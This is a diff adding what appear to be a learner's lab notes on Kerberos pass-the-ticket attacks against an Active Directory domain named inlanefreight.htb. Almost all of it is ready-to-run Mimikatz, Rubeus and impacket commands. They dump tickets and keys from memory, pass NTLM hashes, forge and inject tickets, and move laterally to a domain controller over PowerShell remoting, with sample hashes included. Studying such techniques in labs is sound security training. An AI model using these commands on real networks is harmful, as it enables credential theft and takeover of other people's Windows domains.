@@ -1,0 +1,96 @@
+PASS THE TICKET ATTACKS:
+Using stoler Kerberos tickets to move laterally instead of NTLM password hashes
+
+Ticket Granting Ticket (TGT) -- first ticket obtained from Kerberos, and permits more tickets to client
+
+Ticket Granting Service (TGS) -- requestes by users who want to use a service
+
+
+
+
+HARVESTING KERBEROS TICKETS:
+(To collect ALL tickets, we need to execute mimikatz or rubeus as an admin)
+
+MIMIKATZ
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+exit
+dir *.kirbi
+
+The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
+
+
+
+RUBEUS
+Rubeus.exe dump /nowrap
+
+
+
+
+FORGING TICKETS (THEN PASSING THE TICKETS):
+
+Mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+
+(Take note of the AES256_HMAC and RC4_HMAC keys[ntlm])
+
+then
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+
+(this will authenticate as the user we want to forge tickets for)
+(now authenticated as the target user:)
+
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+
+PtT:
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+or (if we have a ticket:)
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+or (if we have ticket in b64:)
+Rubeus.exe ptt /ticket:<b64-hash>
+
+
+
+PERFORMING THE ATTACK W/ FORGED TICKETS:
+Mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+then
+misc::cmd
+
+or
+(FOR LATERAL MOVEMENT ONTO A DIFFERENT HOST [in this case DC01])
+exit
+powershell
+Enter-PSSession -ComputerName DC01
+
+
+
+TO GAIN EXTRA POWERRRRR OR VISIBILITTYYYY:
+POWERSHELL REMOTING W/ PTT:
+
+Creating a sacrificial process:
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+
+then
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+
+powershell
+Enter-PSSession -ComputerName DC01
+
+
+
+
+HOW TO CONVERT TICKETS! (CCACHE FILES <-> .KIRBI FILES)
+converting from ccache to kirbi:
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+
+
+USING KIRBI FILE IN RUBEUS.EXE:
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+
